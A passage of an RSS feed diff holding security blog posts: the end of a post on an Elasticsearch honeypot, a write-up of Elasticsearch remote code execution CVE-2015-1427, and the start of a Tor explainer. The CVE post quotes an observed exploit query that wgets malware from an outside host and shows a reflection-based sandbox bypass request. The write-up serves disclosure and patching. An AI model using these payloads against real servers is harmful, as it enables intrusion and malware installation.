+&lt;p&gt;Now, I&amp;rsquo;m sure you&amp;rsquo;re interested in some samples. &lt;a href=&#34;https://gist.githubusercontent.com/jordan-wright/f63575681373f91e462f/raw/b446a9d3bb042aac425970d73c129d4d936478aa/elastichoney.log&#34;&gt;Here&amp;rsquo;s&lt;/a&gt; a bit of what I have so far. There&amp;rsquo;s some nifty &lt;code&gt;wget&lt;/code&gt; calls in there if you grab them fast enough.&lt;/p&gt;
+
+&lt;p&gt;Enjoy!&lt;/p&gt;
+
+&lt;h3 id=&#34;want-to-run-this-yourself:c0ae86186de728bbad406ae19d00e422&#34;&gt;Want to Run This Yourself?&lt;/h3&gt;
+
+&lt;p&gt;&lt;em&gt;Awesome.&lt;/em&gt; Let&amp;rsquo;s take a look at what it takes to get elastichoney up and running. Installation should take about&amp;hellip; 5 seconds. Since this is written in Go, I can provide binaries for most platforms. If you&amp;rsquo;re interested in running elastichoney yourself, just download &lt;a href=&#34;http://github.com/jordan-wright/elastichoney/releases&#34;&gt;the right binary&lt;/a&gt; for your system, edit the config to your liking, and start it up!&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s talk about some of the config options. The first option to note is &lt;code&gt;use_remote&lt;/code&gt;. I mentioned that elastichoney will log to &lt;code&gt;stdout&lt;/code&gt; and a file by default. You can set this option to also have the honeypot send an HTTP &lt;code&gt;POST&lt;/code&gt; containing the JSON entry to a remote server of your choosing. Personally, I have my entries going to a real elasticsearch instance so I can search on them later.&lt;sup&gt;1&lt;/sup&gt;&lt;/p&gt;
+
+&lt;p&gt;The second config option that you may want to play with is the &lt;code&gt;spoofed_version&lt;/code&gt; option. This lets you pick what version of ES you want your honeypot to show up as. This helps if you are looking for attackers targeting specific systems (such as those targeting the &amp;lt;=v1.2 RCE vuln vs the most recent RCE vuln).&lt;/p&gt;
+
+&lt;p&gt;Finally, the last option you might set is the &lt;code&gt;anonymous&lt;/code&gt; option. This simply determines if you want your honeypot IP to show up in logs. If so, elastichoney will make a single call out to icanhazip.com when it starts up to get the external IP. Otherwise, it&amp;rsquo;ll just use &lt;code&gt;1.1.1.1&lt;/code&gt;&lt;sup&gt;2&lt;/sup&gt;. This is helpful if you want to create an anonymous cluster of honeypots.&lt;/p&gt;
+
+&lt;p&gt;As always, let me know if you have any questions or comments below.&lt;/p&gt;
+
+&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;[1] Irony.&lt;br/&gt;
+[2] Big shout-out to the person actually on &lt;code&gt;1.1.1.1&lt;/code&gt;.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Remote Code Execution in Elasticsearch - CVE-2015-1427</title>
+      <link>http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/</link>
+      <pubDate>Sun, 08 Mar 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/elk_rce.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;blockquote&gt;
+&lt;p&gt;TL;DR If you have an elasticsearch instance that is publicly available, upgrade to 1.4.3 or later &lt;strong&gt;now&lt;/strong&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Elasticsearch (the &amp;ldquo;E&amp;rdquo; in ELK) is a full-text search engine that makes data aggregation and querying easy. It has an extensive JSON API that allows everything from searching to system management. This post will show how a new vulnerability, CVE-2015-1427, allows attackers to leverage features of this API to gain unauthenticated remote code execution (RCE).&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Much of the analysis discovering this vulnerability was originally found on a blog post &lt;a href=&#34;http://drops.wooyun.org/papers/5107&#34;&gt;here&lt;/a&gt; (&lt;a href=&#34;https://translate.google.com/translate?hl=en&amp;amp;sl=zh-CN&amp;amp;tl=en&amp;amp;u=http%3A%2F%2Fdrops.wooyun.org%2Fpapers%2F5107&#34;&gt;translated&lt;/a&gt;). This post aims to translate and provide more detail on the vulnerability.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;this-isn-t-elasticsearch-s-first-rodeo:df7eaa8af318942c9b37ef17386b8c42&#34;&gt;This Isn&amp;rsquo;t Elasticsearch&amp;rsquo;s First Rodeo&lt;/h3&gt;
+
+&lt;p&gt;One feature of the &lt;code&gt;_search&lt;/code&gt; API endpoint is to allow users to &lt;a href=&#34;http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html&#34;&gt;submit Groovy code&lt;/a&gt; in the search query itself. The server will then execute the code in a sandboxed environment, returning the result to the user. This way, the elasticsearch code can be used to execute&amp;hellip; more code&lt;sup&gt;1&lt;/sup&gt;&lt;/p&gt;
+
+&lt;p&gt;Allowing anybody to submit server-side code to get executed is a &lt;em&gt;dangerous&lt;/em&gt; game to play. In fact, this isn&amp;rsquo;t the first time Elasticsearch has been bitten by this feature. Elasticsearch pre-1.2 didn&amp;rsquo;t have a sandbox &lt;em&gt;at all&lt;/em&gt;, and allowed anyone to submit code to be executed. Since there are zero authentication controls built into elasticsearch, if the service is exposed to the Internet, anyone can own a server with a query like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&amp;quot;query&amp;quot;:
+    {&amp;quot;filtered&amp;quot;: {
+        &amp;quot;query&amp;quot;: {&amp;quot;match_all&amp;quot;: {}}}},
+        &amp;quot;script_fields&amp;quot;: {&amp;quot;exp&amp;quot;: {
+            &amp;quot;script&amp;quot;: &amp;quot;import java.util.*;import java.io.*;String str = \&amp;quot;\&amp;quot;;BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\&amp;quot;wget -O /tmp/malware http://x.x.x.x/malware \&amp;quot;).getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\&amp;quot;\r\n\&amp;quot;);}sb.toString();&amp;quot;
+    }}}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Fun fact! This is an actual exploit attempt I&amp;rsquo;ve seen on my server.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This isn&amp;rsquo;t anything new. In fact, there&amp;rsquo;s a &lt;a href=&#34;http://www.rapid7.com/db/modules/exploit/multi/elasticsearch/script_mvel_rce&#34;&gt;Metasploit module&lt;/a&gt; that makes this easy.&lt;/p&gt;
+
+&lt;p&gt;Starting with version 1.3, Elasticsearch &lt;a href=&#34;http://www.elasticsearch.org/blog/scripting/&#34;&gt;allowed sending Groovy scripts&lt;/a&gt; in the query again. However, they added a sandbox to control what classes and functions can be executed.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s take a quick look at how the sandbox works to get a feel for how it can be exploited.&lt;/p&gt;
+
+&lt;h3 id=&#34;how-the-sandbox-works:df7eaa8af318942c9b37ef17386b8c42&#34;&gt;How the Sandbox Works&lt;/h3&gt;
+
+&lt;p&gt;The functions and classes that are allowed by the sandbox are found in &lt;a href=&#34;https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/script/groovy/GroovySandboxExpressionChecker.java&#34;&gt;&lt;code&gt;GroovySandboxExpressionChecker.java&lt;/code&gt;&lt;/a&gt;. Looking at the code, we notice the function &lt;code&gt;isAuthorized&lt;/code&gt;. This function takes in an expression and checks to see if it is allowed to be executed.&lt;/p&gt;
+
+&lt;p&gt;Without going through &lt;strong&gt;everything&lt;/strong&gt; the sandbox does, here&amp;rsquo;s the important part of the function:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;if (expression instanceof MethodCallExpression) {
+    MethodCallExpression mce = (MethodCallExpression) expression;
+    String methodName = mce.getMethodAsString();
+    if (methodBlacklist.contains(methodName)) {
+        return false;
+    } else if (methodName == null &amp;amp;&amp;amp; mce.getMethod() instanceof GStringExpression) {
+        // We do not allow GStrings for method invocation, they are a security risk
+        return false;
+    }
+    //snip
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is the condition that checks to see if our method call is allowed to be executed. There are two checks we need to bypass in order to make this happen:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;if (methodBlacklist.contains(methodName))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The &lt;code&gt;methodBlacklist&lt;/code&gt; contains the following method calls that we can&amp;rsquo;t use:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static String[] defaultMethodBlacklist = new String[]{
+    &amp;quot;getClass&amp;quot;,
+    &amp;quot;wait&amp;quot;,
+    &amp;quot;notify&amp;quot;,
+    &amp;quot;notifyAll&amp;quot;,
+    &amp;quot;finalize&amp;quot;
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok, so we can&amp;rsquo;t use any of those. Next, we need to make sure that our method name isn&amp;rsquo;t null, and we don&amp;rsquo;t use a &lt;a href=&#34;http://groovy.codehaus.org/api/org/codehaus/groovy/ast/expr/GStringExpression.html&#34;&gt;&lt;code&gt;GStringExpression&lt;/code&gt;&lt;/a&gt;. No problem.&lt;/p&gt;
+
+&lt;p&gt;There&amp;rsquo;s one more hurdle that we have to overcome. This sandbox also restricts the packages that can have methods called on them (from &lt;a href=&#34;https://github.com/groovy/groovy-core/blob/0b2182bff2250150e69ccb988f367e709b4560de/src/main/org/codehaus/groovy/control/customizers/SecureASTCustomizer.java#L854&#34;&gt;&lt;code&gt;SecureASTCustomizer.java&lt;/code&gt;&lt;/a&gt;):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;if (receiversWhiteList != null &amp;amp;&amp;amp; !receiversWhiteList.contains(typeName)) {
+    throw new SecurityException(&amp;quot;Method calls not allowed on [&amp;quot; + typeName + &amp;quot;]&amp;quot;);
+} else if (receiversBlackList != null &amp;amp;&amp;amp; receiversBlackList.contains(typeName)) {
+    throw new SecurityException(&amp;quot;Method calls not allowed on [&amp;quot; + typeName + &amp;quot;]&amp;quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The whitelist for elasticsearch is found in the variable &lt;code&gt;defaultReceiverWhitelist&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private final static String[] defaultReceiverWhitelist = new String [] {
+    groovy.util.GroovyCollections.class.getName(),
+    java.lang.Math.class.getName(),
+    java.lang.Integer.class.getName(), &amp;quot;[I&amp;quot;, &amp;quot;[[I&amp;quot;, &amp;quot;[[[I&amp;quot;,
+    //snip
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On the surface, this eliminates our ability to call any methods on interesting packages, such as &lt;code&gt;java.lang.Runtime&lt;/code&gt;, which could be used to execute system commands. However, there&amp;rsquo;s a way we can bypass both the package whitelist and the method blacklist to execute our code. This is done through a tricky Java feature called &lt;a href=&#34;http://docs.oracle.com/javase/tutorial/reflect/&#34;&gt;&lt;code&gt;reflection&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;bypassing-the-sandbox-with-reflection:df7eaa8af318942c9b37ef17386b8c42&#34;&gt;Bypassing the Sandbox with Reflection&lt;/h3&gt;
+
+&lt;p&gt;Vulnerabilities can often be reverse-engineered by inspecting the patches since the previous release. The commit that we will look at is &lt;a href=&#34;https://github.com/elasticsearch/elasticsearch/commit/68c4a6201e6c889b272c1b64550237fe6d172b47&#34;&gt;here&lt;/a&gt;. The changes in this commit give us some hints about how we can exploit the vulnerability:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/elk/rce.png&#34;/&gt;&lt;/p&gt;
+
+&lt;p&gt;This makes it pretty clear that we can probably do something with the &lt;code&gt;.class&lt;/code&gt; and &lt;code&gt;.forName()&lt;/code&gt; method calls. These methods, chained together, allow us to take one package class (such as one found in the whitelist) and use it to load a reference to a completely separate class (such as &lt;code&gt;java.lang.Runtime&lt;/code&gt;) via reflection.&lt;/p&gt;
+
+&lt;p&gt;So what does this look like?&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s see if we can load the &lt;code&gt;java.lang.Runtime&lt;/code&gt; package by using reflection off of the &lt;code&gt;java.lang.Math&lt;/code&gt; package, which is in the whitelist of packages we can use:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ curl http://localhost:9200/_search?pretty -XPOST -d &#39;{&amp;quot;script_fields&amp;quot;: {&amp;quot;myscript&amp;quot;: {&amp;quot;script&amp;quot;: &amp;quot;java.lang.Math.class.forName(\&amp;quot;java.lang.Runtime\&amp;quot;)&amp;quot;}}}&#39;
+
+{
+  &amp;lt;snip&amp;gt;
+  &amp;quot;hits&amp;quot; : {
+    &amp;quot;total&amp;quot; : 8,
+    &amp;quot;max_score&amp;quot; : 1.0,
+    &amp;quot;hits&amp;quot; : [ {
+      &amp;lt;snip&amp;gt;
+      &amp;quot;fields&amp;quot; : {
+        &amp;quot;myscript&amp;quot; : [ &amp;quot;class java.lang.Runtime&amp;quot; ]
+      }
+    }
+}}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;em&gt;Success!&lt;/em&gt; We can see the result of our query returned an instance of the &lt;code&gt;java.lang.Runtime&lt;/code&gt; class. We can use this instance to execute system commands on the server.&lt;/p&gt;
+
+&lt;p&gt;I won&amp;rsquo;t provide a full proof-of-concept, but all the pieces are here. Using a mix of the first exploit shown above along with the way I&amp;rsquo;ve shown to get a reference to the &lt;code&gt;java.lang.Runtime&lt;/code&gt; package, it is pretty straightforward to run whatever commands you want.&lt;/p&gt;
+
+&lt;h3 id=&#34;conclusion:df7eaa8af318942c9b37ef17386b8c42&#34;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;This vulnerability was not heavily advertised, but it is absolutely critical. In fact, I had one of my own elasticsearch instances compromised this way, showing this vulnerability is heavily being exploited in the wild.&lt;/p&gt;
+
+&lt;p&gt;Elasticsearch recommends to only allow the software to be accessed locally, but there are a &lt;em&gt;ton&lt;/em&gt; of publicly available ES instances. This is likely because the default configuration listens on &lt;code&gt;0.0.0.0:9200&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;If you use elasticsearch, and haven&amp;rsquo;t upgraded to 1.4.3 (or the latest 1.4.4), I recommend upgrading &lt;strong&gt;immediately&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;As always, let me know if you have any questions or comments below!&lt;/p&gt;
+
+&lt;p&gt;Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;&lt;sup&gt;1&lt;/sup&gt; There&amp;rsquo;s an Xzibit joke to be made here.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>How Tor Works: Part One</title>
+      <link>http://jordan-wright.com/blog/2015/02/28/how-tor-works-part-one/</link>
+      <pubDate>Sat, 28 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/02/28/how-tor-works-part-one/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/how_tor_works_1.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction:b6a2f7f7305d0d4a88042f3de1458bb0&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Tor is an anonymity tool used by those who want to stay private and uncensored when browsing the Internet. Over time, it&amp;rsquo;s grown to be pretty darn good at this. This makes the security, stability, and speed of the underlying network critical to those depending on it.&lt;/p&gt;
+
+&lt;p&gt;But how does Tor work under the hood? In this series of posts, we&amp;rsquo;ll take a deep dive into the structure and protocols used by the Tor network in order to see first-hand how Tor operates.&lt;/p&gt;
+
+&lt;h3 id=&#34;brief-history-of-tor:b6a2f7f7305d0d4a88042f3de1458bb0&#34;&gt;Brief History of Tor&lt;/h3&gt;
+
+&lt;p&gt;The concept of Onion Routing (more on why it&amp;rsquo;s called this later) was first &lt;a href=&#34;http://www.onion-router.net/History.html&#34;&gt;proposed&lt;/a&gt; in 1995, where it was first funded by the &lt;a href=&#34;http://www.onr.navy.mil/&#34;&gt;Office of Naval Research&lt;/a&gt; (ONR) and later helped out by DARPA in 1997. Since then, funding for the Tor Project has been provided by a &lt;a href=&#34;https://www.torproject.org/about/sponsors.html.en&#34;&gt;number of different sponsors&lt;/a&gt;, and the Tor Project was recently announced a winner of the &lt;a href=&#34;http://www.redditblog.com/2015/02/announcing-winners-of-reddit-donate.html&#34;&gt;reddit donate&lt;/a&gt; campaign.&lt;/p&gt;
+
+&lt;p&gt;The Tor software as we know it today was originally open-sourced in October of 2003, and is the 3&lt;sup&gt;rd&lt;/sup&gt; generation of Onion Routing software. This idea of Onion Routing was (and is!) simply that we can wrap traffic in encrypted layers (like &lt;em&gt;onions&lt;/em&gt;) in order to protect the contents of the data as well as the anonymity of the sender and receiver.&lt;/p&gt;
+
+&lt;h3 id=&#34;tor-101:b6a2f7f7305d0d4a88042f3de1458bb0&#34;&gt;Tor 101&lt;/h3&gt;
+
+&lt;p&gt;Now that we know a bit about Tor&amp;rsquo;s history, let&amp;rsquo;s talk about how it works. At an &lt;em&gt;extremely&lt;/em&gt; high level, Tor works by bouncing connections from your computer to destinations (such as google.com) through a series of intermediate computers, or &lt;strong&gt;relays&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div style=&#34;padding:10px;background:#3498DB;border-radius:5px;&#34;&gt;
+&lt;svg
+   xmlns:dc=&#34;http://purl.org/dc/elements/1.1/&#34;
+   xmlns:cc=&#34;http://creativecommons.org/ns#&#34;
+   xmlns:rdf=&#34;http://www.w3.org/1999/02/22-rdf-syntax-ns#&#34;
+   xmlns:svg=&#34;http://www.w3.org/2000/svg&#34;
+   xmlns=&#34;http://www.w3.org/2000/svg&#34;
+   width=&#34;100%&#34;
+   height=&#34;482&#34;
+   style=&#34;max-height:250px;&#34;
+   onclick=&#34;d.reset().play();&#34;
+   viewBox=&#34;0 0 748 483&#34;
+   id=&#34;earth&#34;
+   version=&#34;1.1&#34;&gt;
+  &lt;defs
+     id=&#34;defs5976&#34; /&gt;
+  &lt;g
+     inkscape:label=&#34;Layer 1&#34;
+     inkscape:groupmode=&#34;layer&#34;
+     id=&#34;layer1&#34;
+     transform=&#34;translate(-135.6,-230.9)&#34;&gt;
+    &lt;g
+       id=&#34;g6088&#34;
+       transform=&#34;matrix(9.9,0,0,9.9,135.6,230.9)&#34;
+       style=&#34;fill:#ffffff&#34;&gt;
+      &lt;g
+         id=&#34;g6036&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+	&lt;g
+   id=&#34;g6038&#34;
+   style=&#34;fill:#ffffff&#34;&gt;
+		&lt;polygon
+   id=&#34;polygon6040&#34;
+   points=&#34;35.5,9.4 34.7,9.5 34.5,9.9 34.5,10.2 34.9,10.5 35.4,10.8 35.4,11.1 34.9,11.2 34.8,12.0 35.5,12.0 36.3,11.9 36.8,11.4 36.3,11.2 36.0,10.9 35.7,10.3 &#34;
+   style=&#34;fill:#ffffff&#34; /&gt;
+
+		&lt;polygon
+   id=&#34;polygon6042&#34;
+   points=&#34;33.8,10.5 33.3,11.2 33.3,11.7 33.8,11.7 34.8,11.1 34.8,10.6 34.4,10.4 &#34;
+   style=&#34;fill:#ffffff&#34; /&gt;
+
+		&lt;path
+   id=&#34;path6044&#34;
+   d=&#34;m 22.4,13.1 -0.1,0.3 h -0.6 v 0.3 h 0.1 c 0,0 0.0,0.0 0.0,0.1 l 0.3,-0.0 0.2,-0.1 0.0,-0.3 0.3,-0.0 0.1,-0.2 -0.2,-0.0 -0.2,0.0 z&#34;
+   inkscape:connector-curvature=&#34;0&#34;
+   style=&#34;fill:#ffffff&#34; /&gt;
+
+		&lt;polygon
+   id=&#34;polygon6046&#34;
+   points=&#34;20.8,13.7 20.7,14.0 21.2,14.0 21.2,13.7 21.0,13.4 &#34;
+   style=&#34;fill:#ffffff&#34; /&gt;
+
+		&lt;path
+   id=&#34;path6048&#34;
+   d=&#34;M 48.6,24.0 C 48.6,23.3 48.5,22.6 48.5,21.9 48.2,19.6 47.7,17.4 46.9,15.3 46.8,15.1 46.7,15.0 46.7,14.8 45.6,12.2 44.0,9.8 42.1,7.8 42.0,7.6 41.9,7.5 41.7,7.4 41.4,7.0 41.0,6.6 40.6,6.3 36.3,2.4 30.6,0 24.3,0 17.9,0 12.1,2.4 7.8,6.4 6.8,7.3 5.9,8.3 5.0,9.4 1.8,13.5 0,18.7 0,24.3 c 0,13.4 10.9,24.3 24.3,24.3 9.4,0 17.6,-5.4 21.6,-13.2 0.8,-1.6 1.5,-3.4 1.9,-5.3 0.1,-0.4 0.2,-0.9 0.3,-1.4 0.2,-1.3 0.3,-2.8 0.3,-4.2 10e-4,-0.0 -0.0,-0.1 -0.0,-0.2 z m -4.5,-9.7 0.1,-0.1 c 0.1,0.3 0.3,0.7 0.5,1.0 l -0.2,-0.0 -0.4,0.0 V 14.3 z M 40.5,10.1 40.5,9.0 c 0.3,0.4 0.7,0.8 1.1,1.2 l -0.4,0.6 -1.5,-0.0 -0.0,-0.3 0.9,-0.4 z M 11.2,7.4 V 7.3 h 0.4 l 0.0,-0.1 h 0.7 v 0.3 l -0.2,0.3 h -1.0 l 10e-4,-0.4 0,0 z m 0.7,1.0 c 0,0 0.4,-0.0 0.5,-0.0 0.0,0 0,0.4 0,0.4 L 11.4,8.9 11.2,8.7 11.9,8.4 z m 33.6,9.6 h -1.7 l -1.0,-0.8 -1.1,0.1 v 0.6 h -0.3 l -0.3,-0.2 -1.9,-0.5 v -1.2 l -2.5,0.1 -0.7,0.4 h -0.9 l -0.4,-0.0 -1.2,0.6 v 1.2 l -2.4,1.7 0.2,0.7 h 0.5 L 31,21.8 l -0.3,0.1 -0.0,1.8 2.1,2.4 h 0.9 l 0.0,-0.1 h 1.6 l 0.4,-0.4 h 0.9 l 0.5,0.5 1.4,0.1 -0.1,1.8 1.5,2.7 -0.8,1.5 0.0,0.7 0.6,0.6 v 1.7 l 0.8,1.1 v 1.4 h 0.7 c -4.0,5.0 -10.3,8.2 -17.3,8.2 C 12.0,46.6 2,36.6 2,24.3 2,21.2 2.6,18.2 3.7,15.5 V 14.8 L 4.5,13.9 C 4.8,13.3 5.1,12.8 5.4,12.3 L 5.5,12.7 4.5,13.9 C 4.2,14.4 4.0,15.0 3.7,15.5 v 1.2 l 0.9,0.4 v 1.7 l 0.8,1.5 0.7,0.1 0.0,-0.5 -0.8,-1.3 -0.1,-1.2 h 0.5 l 0.2,1.3 1.2,1.7 -0.3,0.5 0.7,1.1 1.9,0.4 v -0.3 l 0.7,0.1 -0.0,0.5 0.6,0.1 0.9,0.2 1.3,1.5 1.7,0.1 0.1,1.3 -1.1,0.8 -0.0,1.2 -0.1,0.7 1.6,2.1 0.1,0.7 c 0,0 0.6,0.1 0.6,0.1 0.0,0 1.3,0.9 1.3,0.9 v 3.8 l 0.4,0.1 -0.3,1.7 0.7,1.0 -0.1,1.7 1.0,1.8 1.3,1.1 1.3,0.0 0.1,-0.4 -0.9,-0.8 0.0,-0.4 0.1,-0.5 0.0,-0.5 -0.6,-0.0 -0.3,-0.4 0.5,-0.5 0.0,-0.3 -0.6,-0.1 0.0,-0.3 0.8,-0.1 1.3,-0.6 0.4,-0.8 1.3,-1.7 -0.3,-1.3 0.4,-0.7 1.2,0.0 0.8,-0.6 0.2,-2.6 0.9,-1.2 0.1,-0.7 -0.8,-0.2 -0.5,-0.9 -1.9,-0.0 -1.5,-0.5 -0.0,-1.1 -0.5,-0.9 -1.4,-0.0 -0.8,-1.2 -0.7,-0.3 -0.0,0.3 -1.3,0.0 -0.4,-0.6 -1.3,-0.2 -1.1,1.3 -1.7,-0.3 -0.1,-2.0 -1.2,-0.2 0.5,-0.9 -0.1,-0.5 -1.7,1.1 -1.0,-0.1 -0.3,-0.8 0.2,-0.8 0.5,-1.0 1.3,-0.6 2.6,-0.0 -0.0,0.8 0.9,0.4 -0.0,-1.3 0.6,-0.6 1.3,-0.9 0.0,-0.6 1.3,-1.4 1.4,-0.8 -0.1,-0.1 0.9,-0.9 0.3,0.0 0.1,0.2 0.3,-0.4 0.0,-0.0 -0.4,-0.0 -0.4,-0.1 v -0.4 l 0.2,-0.1 h 0.4 l 0.2,0.0 0.1,0.3 0.2,-0.0 v -0.0 l 0.0,0.0 0.6,-0.1 0.0,-0.3 0.3,0.0 v 0.3 l -0.3,0.2 h 10e-4 l 0.0,0.3 1.2,0.3 c 0,0 10e-4,0.0 0.0,0.0 l 0.2,-0.0 0.0,-0.5 -0.9,-0.4 -0.0,-0.2 0.8,-0.2 0.0,-0.7 -0.8,-0.5 -0.0,-1.3 -1.1,0.5 h -0.4 l 0.1,-1.0 -1.5,-0.3 -0.6,0.4 v 1.5 l -1.1,0.3 -0.4,0.9 -0.5,0.0 V 10.5 L 16.9,10.3 16.3,10.0 16.1,9.2 18.1,8.0 19.0,7.7 19.1,8.4 19.7,8.3 19.7,8.0 20.3,7.9 20.3,7.8 20.1,7.7 20.0,7.4 l 0.6,-0.0 0.4,-0.4 0.0,-0.0 0.0,0.0 0.1,-0.1 1.4,-0.1 0.6,0.5 -1.6,0.9 2.1,0.5 0.2,-0.7 h 0.9 L 25.4,7.1 24.7,7.0 V 6.2 L 22.6,5.2 21.2,5.4 20.4,5.8 20.4,6.9 19.6,6.7 19.5,6.2 20.3,5.4 18.8,5.3 l -0.4,0.1 -0.1,0.5 0.5,0.0 -0.1,0.5 -0.9,0.0 -0.1,0.3 -1.3,0.0 c 0,0 -0.0,-0.7 -0.0,-0.7 -0.0,0 1.0,-0.0 1.0,-0.0 L 18.0,5.5 17.5,5.3 16.9,5.8 15.9,5.8 15.3,5.0 H 14.1 L 12.8,6.0 h 1.2 l 0.1,0.3 -0.3,0.2 1.3,0.0 0.2,0.4 L 13.8,7.1 13.7,6.7 12.8,6.5 12.3,6.2 11.2,6.2 C 14.8,3.5 19.4,2 24.3,2 c 5.6,0 10.7,2.1 14.7,5.5 l -0.2,0.4 -1.0,0.4 -0.4,0.4 0.1,0.5 0.5,0.0 0.3,0.8 0.9,-0.3 0.1,1.0 h -0.2 l -0.7,-0.1 -0.8,0.1 -0.8,1.1 -1.1,0.1 -0.1,0.9 0.4,0.1 -0.1,0.6 -1.1,-0.2 -1.0,0.2 -0.2,0.5 0.1,1.2 0.6,0.2 1.0,-0.0 0.6,-0.0 0.2,-0.5 1.0,-1.4 0.7,0.1 0.7,-0.6 0.1,0.5 1.7,1.1 -0.2,0.2 -0.7,-0.0 0.3,0.4 0.4,0.1 0.5,-0.2 -0.0,-0.6 0.2,-0.1 -0.2,-0.2 -1.1,-0.6 -0.3,-0.8 h 0.9 l 0.3,0.3 0.8,0.7 0.0,0.8 0.8,0.9 0.3,-1.2 0.5,-0.3 0.1,1.0 0.5,0.6 1.1,-0.0 c 0.2,0.5 0.4,1.1 0.6,1.7 l -0.1,0.1 z m -32.3,-7.0 0.5,-0.2 0.5,0.1 -0.1,0.7 -0.5,0.1 -0.3,-0.7 z m 3.0,1.6 v 0.4 h -1.3 l -0.5,-0.1 0.1,-0.3 0.6,-0.2 h 0.8 v 0.2 h 0.1 z m 0.6,0.6 V 13.8 l -0.3,0.2 -0.4,0.0 c 0,0 0,-0.6 0,-0.7 h 0.7 z m -0.3,-0.1 v -0.5 l 0.4,0.4 -0.4,0.1 z m 0.2,1.0 v 0.4 l -0.3,0.3 h -0.7 l 0.1,-0.4 0.3,-0.0 0.0,-0.1 0.5,-0.0 z m -1.7,-0.8 h 0.7 l -0.9,1.3 -0.3,-0.2 0.0,-0.5 0.5,-0.5 z m 3.0,0.7 v 0.4 H 17.3 l -0.1,-0.2 v -0.4 h 0.0 l 0.8,0.2 z m -0.6,-0.5 0.2,-0.2 0.3,0.2 -0.2,0.2 -0.2,-0.2 z m 28.5,5.7 0.0,-0.0 c 0.0,0.1 0.0,0.2 0.0,0.3 l -0.1,-0.2 z&#34;
+   inkscape:connector-curvature=&#34;0&#34;
+   style=&#34;fill:#ffffff&#34; /&gt;
+
+		&lt;path
+   id=&#34;path6050&#34;
+   d=&#34;M 3.7,14.8 V 15.5 C 4.0,15.0 4.2,14.4 4.5,13.9 l -0.7,0.9 z&#34;
+   inkscape:connector-curvature=&#34;0&#34;
+   style=&#34;fill:#ffffff&#34; /&gt;
+
+	&lt;/g&gt;
+
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6052&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6054&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6056&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6058&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6060&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6062&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6064&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6066&#34;
